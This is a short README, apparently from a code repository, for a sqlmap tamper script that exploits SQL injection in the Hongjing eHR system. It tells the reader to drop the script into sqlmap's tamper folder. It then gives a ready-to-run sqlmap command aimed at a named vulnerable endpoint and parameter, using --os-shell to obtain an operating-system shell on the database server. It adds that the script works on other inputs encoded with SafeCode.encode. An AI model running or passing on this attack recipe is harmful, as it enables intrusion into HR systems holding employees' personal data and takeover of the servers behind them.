# ehr_SafeCodeEncode_tamper
宏景ehr sql注入的tamper脚本（sqlmap使用）

# 使用方法

将该脚本放在sqlmap/tamper/目录下

使用命令开始注入
```
python3 sqlmap.py -u "http://x.x.x.x/servlet/codesettree?categories=1&codesetid=1&flag=c&parentid=-1&status=1"  -p categories --dbms="Microsoft SQL Server" --tamper ehr_SafeCodeEncode_tamper  --os-shell --level 3
```

注：其他注入点如果也通过SafeCode.encode方法编码的话，也可以利用该脚本进行注入。
